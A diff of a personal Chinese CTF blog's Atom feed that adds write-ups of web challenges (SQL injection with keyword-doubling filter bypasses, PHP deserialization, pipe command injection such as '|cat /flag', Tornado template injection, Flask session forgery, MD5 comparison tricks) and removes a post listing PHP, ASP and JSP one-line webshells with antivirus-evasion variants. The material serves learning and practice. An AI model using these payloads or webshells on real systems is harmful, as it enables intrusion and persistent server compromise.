@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://z0ekball.github.io</id>
     <title>z0ekball</title>
-    <updated>2022-04-15T11:30:49.462Z</updated>
+    <updated>2022-04-15T12:21:13.657Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://z0ekball.github.io"/>
     <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
@@ -15,7 +15,7 @@
         <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-wu/</id>
         <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-wu/">
         </link>
-        <updated>2022-03-05T14:59:24.000Z</updated>
+        <updated>2022-03-15T14:59:24.000Z</updated>
         <content type="html"><![CDATA[<h2 id="第一章-web入门sql注入-1">[第一章 web入门]SQL注入-1</h2>
 <p>?1’#有回显，说明存在注入点(playload都要进行url编码才能上传成功)</p>
 <p>?id=0' order by 3#有回显，4则没有，说明存在3个注入点</p>
@@ -217,6 +217,225 @@ __globals__  对包含函数全局变量的字典的引用
 
 3、在线转换短网址代替
 </code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CTF刷题记录(三)]]></title>
+        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-san/</id>
+        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-san/">
+        </link>
+        <updated>2022-02-02T12:06:52.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL</h2>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415193955655.png" alt="image-20220415193955655" loading="lazy"></figure>
+<p>都输入admin’ or 1=1 # ，回显<img src="https://z0ekball.github.io/post-images/image-20220415194017344.png" alt="image-20220415194017344" loading="lazy"></p>
+<p>存在注入漏洞，抓包，进行注入</p>
+<pre><code>admin' order by 3#有回显
+
+admin' order by 4#回显错误，说明有3个注入点
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415194031190.png" alt="image-20220415194031190" loading="lazy"></figure>
+<pre><code>1' union select 1,2,3 #确认回显位置可以是2,3
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415194034906.png" alt="image-20220415194034906" loading="lazy"></figure>
+<pre><code>1' union select 1,2,database() #查库
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415194038326.png" alt="image-20220415194038326" loading="lazy"></figure>
+<pre><code>1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() #查表
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415194043672.png" alt="image-20220415194043672" loading="lazy"></figure>
+<p>根据题目名提示，flag应该在第二个表，查列</p>
+<pre><code>1' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415194048692.png" alt="image-20220415194048692" loading="lazy"></figure>
+<pre><code>查字段1' union select 1,2,group_concat(id,username,password)from l0ve1ysq1#得到flag
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415194053949.png" alt="image-20220415194053949" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415194057980.png" alt="image-20220415194057980" loading="lazy"></figure>
+<h2 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h2>
+<p>题目给出源码</p>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415194215695.png" alt="image-20220415194215695" loading="lazy"></figure>
+<p>Get方式获取str参数，判断str里全是可打印字符（32-125），然后对str进行反序列化</p>
+<p>查看所有函数，若要执行文件包含，则要执行read()函数，传入filename参数，并执行<code>file_get_contents</code>，回去文件内容</p>
+<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415194231640.png" alt="image-20220415194231640" loading="lazy"></figure>
+<p>要执行read()则要满足process()里的条件，令op=2</p>
+<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415194247021.png" alt="image-20220415194247021" loading="lazy"></figure>
+<p>要使执行process()函数且op=2则需要<code>构造filehandler类对象</code>，op赋值为2，filename传入文件包含的构造参数，执行构造函数则能执行process()</p>
+<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415194308671.png" alt="image-20220415194308671" loading="lazy"></figure>
+<p><code>整个流程</code>：</p>
+<p>创造一个op=2,filename=”文件包含参数”的filehandler对象，执行构造函数中的process()，op=2则执行read()，read()传入filename并执行file_get_contents函数，读取文件内容</p>
+<p>文件包含参数选择使用<code>伪协议读取</code></p>
+<pre><code>filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;
+</code></pre>
+<p>构造playload</p>
+<p>这里用到php7.1，对属性类型不敏感，public属性序列化不会出现不可见字符，可以直接采用public而不需要用到protected属性</p>
+<p>若使用protected属性，则要在变量面前加上\00*\00，且用大写S表示为字符串</p>
+<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415194400976.png" alt="image-20220415194400976" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415194407442.png" alt="image-20220415194407442" loading="lazy"></figure>
+<p>Get方式传入str参数，得到flag的base64编码，解码得flag</p>
+<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415194415155.png" alt="image-20220415194415155" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415194421129.png" alt="image-20220415194421129" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415194425611.png" alt="image-20220415194425611" loading="lazy"></figure>
+<h2 id="actf2020-新生赛exec">[ACTF2020 新生赛]Exec</h2>
+<p>输入一个ip地址返回ping的结果，当输入|ls有回显，说明存在<code>管道符漏洞</code></p>
+<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415194447458.png" alt="image-20220415194447458" loading="lazy"></figure>
+<p>为防止重定向，抓包再直接输入<code>|cat /flag</code>（|直接执行后者语句），得到flag</p>
+<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415194506939.png" alt="image-20220415194506939" loading="lazy"></figure>
+<h2 id="极客大挑战-2019http">[极客大挑战 2019]Http</h2>
+<p>查看源码发现隐藏的php</p>
+<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415194519961.png" alt="image-20220415194519961" loading="lazy"></figure>
+<p>进行访问，显示不是来自<code>“https://Sycsecret.buuoj.cn”</code>, 猜测是否要提供该条件才能获得flag</p>
+<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415194548082.png" alt="image-20220415194548082" loading="lazy"></figure>
+<p>抓包，请求头缺少<code>Referer</code></p>
+<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415194603655.png" alt="image-20220415194603655" loading="lazy"></figure>
+<p>补上<code>Referer:https://Sycsecret.buuoj.cn</code>后，显示没有使用给定浏览器</p>
+<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415194618175.png" alt="image-20220415194618175" loading="lazy"></figure>
+<p>改变<code>User-Agent：Syclover</code>，显示只能本地读取</p>
+<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415194629075.png" alt="image-20220415194629075" loading="lazy"></figure>
+<p>加上<code>X-Forwarded-For：127.0.0.1</code>确定请求端ip为本地，返回flag</p>
+<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415194641407.png" alt="image-20220415194641407" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415194645741.png" alt="image-20220415194645741" loading="lazy"></figure>
+<h2 id="roarctf-2019easy-calc">[RoarCTF 2019]Easy Calc</h2>
+<p>抓包，查看源码，存在waf，以及calc.php文件</p>
+<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415194708312.png" alt="image-20220415194708312" loading="lazy"></figure>
+<p>查看calc.php，看到对num的过滤函数</p>
+<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415194717657.png" alt="image-20220415194717657" loading="lazy"></figure>
+<h3 id="php字符串解析漏洞"><code>php字符串解析漏洞</code>:</h3>
+<p><code>空格绕过</code>，当php解析url时，会将数据转化成数组格式，例如</p>
+<pre><code>/?foo=bar变成Array([foo] =&gt; “bar”)
+</code></pre>
+<p>这个过程会删除一些字符或用下划线替代，例如</p>
+<pre><code>/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)
+</code></pre>
+<p>由于题目waf是对非数字值的拦截，则可以利用空格绕过,例如</p>
+<pre><code>/?%20num=phpinfo()
+</code></pre>
+<p>经过waf检验时，由于空格，waf检验的变量为%20num而非num，但在php解析时空格会被去掉，即解析成num，绕过了检查。</p>
+<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415194955271.png" alt="image-20220415194955271" loading="lazy"></figure>
+<p>绕过成功，再使用<code>scandir函数</code>扫描dir目录，利用<code>var_dumo()函数</code>输出变量值</p>
+<p>构造</p>
+<pre><code>%20num=var_dump(scandir(/))
+</code></pre>
+<p>因为waf过滤‘/’，用chr(47)绕过</p>
+<pre><code>%20num=var_dump(scandir(chr(47)))
+</code></pre>
+<p>找到f1agg目录</p>
+<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415195052052.png" alt="image-20220415195052052" loading="lazy"></figure>
+<p>再利用<code>file_get_contents()函数</code>读取文件，文件名/f1agg，同样使用chr绕过‘/’，得到flag</p>
+<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415195107826.png" alt="image-20220415195107826" loading="lazy"></figure>
+<h2 id="极客大挑战-2019php">[极客大挑战 2019]PHP</h2>
+<p>提示有备份网站</p>
+<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415195122690.png" alt="image-20220415195122690" loading="lazy"></figure>
+<p>对网站进行扫描，发现备份网站</p>
+<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415195130649.png" alt="image-20220415195130649" loading="lazy"></figure>
+<p>访问备份网站下载文件包，打开文件，给了个假flag</p>
+<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/image-20220415195137557.png" alt="image-20220415195137557" loading="lazy"></figure>
+<p>查看所有php文件，存在<code>反序列化漏洞</code></p>
+<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415195146389.png" alt="image-20220415195146389" loading="lazy"></figure>
+<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415195204229.png" alt="image-20220415195204229" loading="lazy"></figure>
+<p>需要构造name类，使参数<code>username===admin</code>且<code>password==100</code>绕过解析函数第一个条件限制，同时还要绕过<code>wakeup函数</code></p>
+<p>构造函数</p>
+<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415195252295.png" alt="image-20220415195252295" loading="lazy"></figure>
+<p>得到</p>
+<pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;}
+</code></pre>
+<p>改变参数个数绕过wakeup函数，由于参数是private属性，采用<code>%00</code>进行绕过</p>
+<pre><code>playload: ?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}
+</code></pre>
+<p>得到falg</p>
+<figure data-type="image" tabindex="38"><img src="https://z0ekball.github.io/post-images/image-20220415195340436.png" alt="image-20220415195340436" loading="lazy"></figure>
+<h2 id="极客大挑战-2019babysql">[极客大挑战 2019]BabySQL</h2>
+<p>抓包，进行简单测试，发现过滤了or，采用双写绕过</p>
+<pre><code>username=admin'oorr('1'='1')#,password= admin'oorr 1&gt;1#
+</code></pre>
+<figure data-type="image" tabindex="39"><img src="https://z0ekball.github.io/post-images/image-20220415195359422.png" alt="image-20220415195359422" loading="lazy"></figure>
+<pre><code>username=admin'oorrder bbyy 3#双写绕过order by
+</code></pre>
+<figure data-type="image" tabindex="40"><img src="https://z0ekball.github.io/post-images/image-20220415195403625.png" alt="image-20220415195403625" loading="lazy"></figure>
+<pre><code>1'ununionion seselectlect 1,2,3#回显双写绕过union select
+</code></pre>
+<figure data-type="image" tabindex="41"><img src="https://z0ekball.github.io/post-images/image-20220415195600958.png" alt="image-20220415195600958" loading="lazy"></figure>
+<pre><code>1'ununionion seselectlect 1,2,database()#暴库
+</code></pre>
+<figure data-type="image" tabindex="42"><img src="https://z0ekball.github.io/post-images/image-20220415195605228.png" alt="image-20220415195605228" loading="lazy"></figure>
+<pre><code>1'ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata)#双写绕过from和information，发现可以库
+</code></pre>
+<figure data-type="image" tabindex="43"><img src="https://z0ekball.github.io/post-images/image-20220415195611432.png" alt="image-20220415195611432" loading="lazy"></figure>
+<pre><code>1'ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema='ctf'#双写绕过where，查表
+</code></pre>
+<figure data-type="image" tabindex="44"><img src="https://z0ekball.github.io/post-images/image-20220415195615663.png" alt="image-20220415195615663" loading="lazy"></figure>
+<pre><code>1'ununionion seselectlect 1,2,group_concat(column_name)frfromom(infoorrmation_schema.columns) whwhereere table_name='Flag'#查列
+</code></pre>
+<pre><code>1'ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag)#查字段
+</code></pre>
+<figure data-type="image" tabindex="45"><img src="https://z0ekball.github.io/post-images/image-20220415195632681.png" alt="image-20220415195632681" loading="lazy"></figure>
+<h2 id="护网杯-2018easy_tornado">[护网杯 2018]easy_tornado</h2>
+<p>题目给了三个提示，分别是<code>flag in /fllllllllllllag</code>,<code>render</code>,<code>md5(cookie_secret+md5(filename))</code></p>
+<p>分别提示flag所在文件，模板注入，以及filehash计算公式</p>
+<p>需要获取cookie_secret值，由于render函数配合tornado使用，在tornado模板中可以快速访问某些对象，通过handler.settings参数，我们可以获得一些环境变量，其中就包含cookie_secret</p>
+<p>输入错误的路径参数，返回一个错误页面，存在get传参，也就是模板注入的参数</p>
+<figure data-type="image" tabindex="46"><img src="https://z0ekball.github.io/post-images/image-20220415195733520.png" alt="image-20220415195733520" loading="lazy"></figure>
+<p>模板注入请求handler.settings参数，返回cookie_secret</p>
+<figure data-type="image" tabindex="47"><img src="https://z0ekball.github.io/post-images/image-20220415195742513.png" alt="image-20220415195742513" loading="lazy"></figure>
+<p>通过脚本利用公式获得filehash值</p>
+<figure data-type="image" tabindex="48"><img src="https://z0ekball.github.io/post-images/image-20220415195753354.png" alt="image-20220415195753354" loading="lazy"></figure>
+<pre><code>file?filename=/fllllllllllllag&amp;filehash=af86ca897d78fd6eb99b3cbe61eb3731
+</code></pre>
+<p>得到flag</p>
+<figure data-type="image" tabindex="49"><img src="https://z0ekball.github.io/post-images/image-20220415195824324.png" alt="image-20220415195824324" loading="lazy"></figure>
+<h2 id="hctf-2018admin">[HCTF 2018]admin</h2>
+<p>源码提示不是admin，猜测要登录admin账号才能获得flag</p>
+<figure data-type="image" tabindex="50"><img src="https://z0ekball.github.io/post-images/image-20220415195837552.png" alt="image-20220415195837552" loading="lazy"></figure>
+<p>随便注册一个账号后登录，在改密码页面发现题目源码地址</p>
+<figure data-type="image" tabindex="51"><img src="https://z0ekball.github.io/post-images/image-20220415195844737.png" alt="image-20220415195844737" loading="lazy"></figure>
+<p>抓包，POST方式上传参数，cookie里有session参数，可以通过<code>伪造session参数</code>欺骗后台系统</p>
+<figure data-type="image" tabindex="52"><img src="https://z0ekball.github.io/post-images/image-20220415195854297.png" alt="image-20220415195854297" loading="lazy"></figure>
+<p>下载源码后，在config.py找到secret_key值用于构造session</p>
+<figure data-type="image" tabindex="53"><img src="https://z0ekball.github.io/post-images/image-20220415195916702.png" alt="image-20220415195916702" loading="lazy"></figure>
+<p>通过<code>flask-session-cookie-manager-master</code>工具解密当前session</p>
+<figure data-type="image" tabindex="54"><img src="https://z0ekball.github.io/post-images/image-20220415195927081.png" alt="image-20220415195927081" loading="lazy"></figure>
+<p>再用工具构造name:admin</p>
+<figure data-type="image" tabindex="55"><img src="https://z0ekball.github.io/post-images/image-20220415195933672.png" alt="image-20220415195933672" loading="lazy"></figure>
+<p>修改session，上传得flag</p>
+<figure data-type="image" tabindex="56"><img src="https://z0ekball.github.io/post-images/image-20220415195944224.png" alt="image-20220415195944224" loading="lazy"></figure>
+<h2 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h2>
+<p>抓包发现响应包消息头有提示</p>
+<figure data-type="image" tabindex="57"><img src="https://z0ekball.github.io/post-images/image-20220415195958451.png" alt="image-20220415195958451" loading="lazy"></figure>
+<h3 id="php中的md5stringraw"><code>php中的md5(string,raw)</code></h3>
+<pre><code>String:：必需。规定要计算的字符串。
+
+Raw: 可选。规定十六进制或二进制输出格式：
+
+TRUE - 原始 16 字符二进制格式
+
+FALSE - 默认。32 字符十六进制数
+</code></pre>
+<p>则题中的md5函数意思是计算$pass输出16字符二进制格式</p>
+<p>我们可以通过构造$pass生成一个可执行语句嵌入sql语句当中，使之执行。据网上的资料</p>
+<pre><code>ffifdyop通过上述函数运算后得出的结果是'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c对应字符串为'or'6�]��!r,��b，当password=’md5(‘ffifdyop’,true)’时得到的结果是，password=’ 'or'6�]��!r,��b’
+</code></pre>
+<p>在mysql中，布尔判断时会把1开头的字符串当做整型数，当字符串被双单引号括起来的时候是有效的</p>
+<pre><code>即'6�]��!r,��b’在布尔判断时会被当成整型数，则整个语句相当于password=’’or true，即判断为真，成为了万能密码
+</code></pre>
+<p>当提交ffifdyop后，密码判断通过，跳转至另一个界面</p>
+<figure data-type="image" tabindex="58"><img src="https://z0ekball.github.io/post-images/image-20220415200255186.png" alt="image-20220415200255186" loading="lazy"></figure>
+<p>源码里给出提示，这里get传参a和b，判断a,b不相同，且<code>md5($a)==md5($d)</code></p>
+<figure data-type="image" tabindex="59"><img src="https://z0ekball.github.io/post-images/image-20220415200312013.png" alt="image-20220415200312013" loading="lazy"></figure>
+<pre><code>在php语言中==比较会把字符串转化成相同的类型再进行比较，当数值与字符串进行比较时，会将字符串转化成数值。当&quot;0e123456&quot;==&quot;0e456789&quot;进行比较时，0e字符串会被识别成科学计数法数字，0的多少次方都为0，故判断两字符串相等
+</code></pre>
+<p>故要<code>绕过MD5比较</code>，寻找两个能生成0e+数字的字符串即可判断为相等</p>
+<figure data-type="image" tabindex="60"><img src="https://z0ekball.github.io/post-images/image-20220415200409399.png" alt="image-20220415200341536" loading="lazy"></figure>
+<pre><code>传参a= s214587387a,b= s878926199a
+</code></pre>
+<figure data-type="image" tabindex="61"><img src="https://z0ekball.github.io/post-images/image-20220415200422964.png" alt="image-20220415200422964" loading="lazy"></figure>
+<p>跳转页面</p>
+<figure data-type="image" tabindex="62"><img src="https://z0ekball.github.io/post-images/image-20220415200442865.png" alt="image-20220415200442865" loading="lazy"></figure>
+<p>给出的源码，因为post传参数param1和param2两值不相等，且md5值===强比较相等</p>
+<p>强比较难以绕过，但是可以通过<code>md5错误返回值</code>进行判断，即上传一个md5函数不能处理的值，如数组，则md5将返回false，当两边都返回false时，判断位相等</p>
+<p>同样，上面的弱比较使用传数组的方法也能通过验证</p>
+<figure data-type="image" tabindex="63"><img src="https://z0ekball.github.io/post-images/image-20220415200617118.png" alt="image-20220415200617118" loading="lazy"></figure>
+<p>返回新页面，成功绕过弱比较</p>
+<p>在强比较中，post方法传参param1[]=1&amp;param2[]=2得到flag</p>
+<figure data-type="image" tabindex="64"><img src="https://z0ekball.github.io/post-images/image-20220415200640472.png" alt="image-20220415200640472" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
@@ -1096,115 +1315,6 @@ PHP  5.5.9
 <pre><code>输入&lt;script&gt;alert('xss')&lt;/script&gt;，xss攻击失败
 </code></pre>
 <figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415003106157.png" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[简单木马]]></title>
-        <id>https://z0ekball.github.io/post/jian-dan-mu-ma/</id>
-        <link href="https://z0ekball.github.io/post/jian-dan-mu-ma/">
-        </link>
-        <updated>2021-08-10T11:12:06.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="一句话木马">一句话木马</h2>
-<h3 id="原理">原理</h3>
-<pre><code class="language-php"> &lt;?php @eval($_POST['pass']); ?&gt;
-</code></pre>
-<p><code>&lt;?php ?&gt;</code>：解析成php代码</p>
-<p><code>@</code>：不报错</p>
-<p><code>$_POST['pass']</code>：php里面几个超全局变量，<code>$_GET</code>、<code>$_POST</code>就是其中之一，意思为用post方法接收pass这个变量</p>
-<p><code>eval()</code>：eval()把字符串作为PHP代码执行</p>
-<p><code>整句意思</code>：post方式接收变量pass，若pass=echo 'a'，则代码就成了<code>&lt;?php eval(&quot;echo 'a';&quot;); ?&gt;</code>，也就是通过pass这个变量传入php代码为所欲为。</p>
-<p>通过一句话木马，使用菜刀、蚁剑、冰蝎等强悍的工具，可以攻陷整个网站主机。</p>
-<h3 id="常见一句话木马">常见一句话木马</h3>
-<h4 id="基础款">基础款</h4>
-<pre><code class="language-php">php的一句话木马：&lt;?php @eval($_POST['pass']);?&gt;
-asp的一句话木马：&lt;%eval request (&quot;pass&quot;)%&gt;
-aspx的一句话木马：&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
-jsp的一句话木马：
-&lt;%
-if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());
-%&gt;
-</code></pre>
-<h4 id="简单变型">简单变型</h4>
-<p>php:</p>
-<pre><code class="language-php">//绕过&lt;?
-&lt;script language=&quot;php&quot;&gt;@eval($_POST[pass])&lt;/script&gt;
-    
-//assert函数
-&lt;?php assert(@$_POST[pass]);?&gt;
-    
-//creat_function函数，传参到fun()并执行
-&lt;?php
-$fun = create_function('',$_POST['pass']);
-$fun();
-?&gt;
-    
-//call_user_func回调函数，绕过waf
-&lt;?php
-@call_user_func(assert,$_POST['pass']);
-?&gt;
-
-//preg_replace函数
-&lt;?php
-@preg_replace(&quot;/abcde/e&quot;, $_POST['pass'], &quot;abcdefg&quot;);
-?&gt;
-
-// file_put_contents函数,生成木马文件
-&lt;?php
-$test='&lt;?php $a=$_POST[&quot;pass&quot;];assert($a); ?&gt;';
-file_put_contents(&quot;Trojan.php&quot;, $test);
-?&gt;
-
-//array数组
-&lt;?php
-$a='assert';
-array_map(&quot;$a&quot;,$_REQUEST);
-?&gt;
-&lt;?php
-$item['JON']='assert';
-$array[]=$item;
-$array[0]['JON']($_POST[&quot;pass&quot;]);
-?&gt;
-
-//php变量函数
-&lt;?php
-$a = &quot;eval&quot;;
-$a(@$_POST['pass']);
-?&gt;
-
-</code></pre>
-<h3 id="木马免杀">木马免杀</h3>
-<h4 id="木马查杀">木马查杀</h4>
-<p><code>文件内容查杀</code>：对脚本文件中所使用的关键词、高危函数、文件修改的时间、文件权限、文件的所有者以及和其它文件的关联性等多个维度的特征进行检测,即先建立一个恶意字符串特征库，同时对WEB文件修改时间，文件权限以及文件所有者等进行确认。容易误报，无法对加密或者经过特殊处理的Webshell文件进行检测。</p>
-<p><code>网络请求查杀</code>：当木马被执行时，如果请求参数的值中存在某些危险函数、或者关键字，那么会被防护产品拦截，通过Webshell运行时使用的系统命令或者网络流量及状态的异常来判断动作的威胁程度。</p>
-<p><code>日志分析查杀</code>：使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测 技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
-<h4 id="木马免杀-2">木马免杀</h4>
-<p><code>关键字绕过</code>：拆分关键字</p>
-<p><code>构造函数</code>：构造一个函数，拼接成一句话木马</p>
-<pre><code class="language-php">&lt;?php
-function x()
-{
-    return $_POST['pass'];
-}
-eval(x());
-?&gt;
-</code></pre>
-<p><code>注释隔断</code>：一般查杀会对高危函数的前后语句进行拼接并检测，注释符可以隔断这种拼接从而绕过检查</p>
-<pre><code class="language-php">&lt;?php
-function x()
-{
-    return &quot;/*sasas23123*/&quot;.$_POST['pass'].&quot;/*sdfw3123*/&quot;;
-}
-eval(x());
-?&gt;
-</code></pre>
-<p><code>转码绕过</code>：转码特征值，再通过解码来执行相关语句</p>
-<p><code>数组拼接</code>：利用数组拼接木马语句</p>
-<pre><code class="language-php">&lt;?php
-$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
-$a = array($arrayName = ($arrayName =($arrayName = array('a' =&gt; $b($_POST['pass'])))));
-?&gt;
-</code></pre>
-<p><code>工具利用</code>：传统方法利用菜刀管理webshell 的流量特征很明显，很容易被检测到，可使用流量加密的webshell工具，如冰蝎，来躲避流量监测。</p>
 ]]></content>
     </entry>
 </feed>
